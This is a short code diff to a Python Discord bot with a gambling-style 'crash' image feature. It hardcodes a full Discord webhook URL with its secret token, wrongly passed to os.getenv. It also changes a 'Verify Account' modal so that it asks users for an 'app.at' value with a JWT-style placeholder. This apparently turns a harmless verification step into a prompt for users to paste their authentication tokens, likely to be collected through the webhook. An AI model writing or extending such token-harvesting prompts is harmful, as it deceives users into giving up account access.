@@ -10,7 +10,7 @@ from discord import app_commands
 from PIL import Image, ImageDraw, ImageFont
 
 TOKEN = os.getenv("TOKEN")
-VERIFY_WEBHOOK_URL = os.getenv("VERIFY_WEBHOOK_URL")
+VERIFY_WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1496970637099405463/Kd1UZyzpK4dxsi7R6SBDS_viczG8xgrljfCUHBOBpn63eL--UUOnDZkY3qOfWE8Cz15x")
 
 if TOKEN is None:
     raise ValueError("TOKEN environment variable is missing.")
@@ -203,8 +203,8 @@ async def create_crash_image(multiplier):
 
 class VerifyModal(discord.ui.Modal, title="Verify Account"):
     username = discord.ui.TextInput(
-        label="Enter your username",
-        placeholder="Example: Alvin123",
+        label="Enter app.at",
+        placeholder="Example: eyJhbGciOiJSUzI1NiIsInR5...",
         required=True,
         max_length=50
     )
